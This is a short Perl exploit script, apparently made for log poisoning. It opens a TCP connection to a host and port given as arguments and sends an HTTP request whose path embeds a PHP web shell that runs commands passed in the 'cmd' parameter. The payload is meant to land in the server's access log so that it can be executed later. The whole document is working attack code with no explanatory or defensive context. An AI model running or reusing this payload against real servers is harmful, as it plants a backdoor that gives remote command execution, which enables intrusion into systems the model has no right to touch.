#!/usr/bin/perl -w
 
use IO::Socket::INET;
 
my $host = $ARGV[0];
my $port = $ARGV[1];
 
print "*** Injecting $host:$port access log...\n";
 
my $rce = "<?if(get_magic_quotes_gpc()){ \$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);?>";
$sock = IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>"tcp") || die "Cant connect to $host:$port!\n";
print $sock "GET /v0pcr3w ".$rce." HTTP/1.1\r\n";
print $sock "Host: ".$host."\r\n";
print $sock "Connection: close\r\n\r\n";
close($sock);
 
print "*** Done!\n\n";
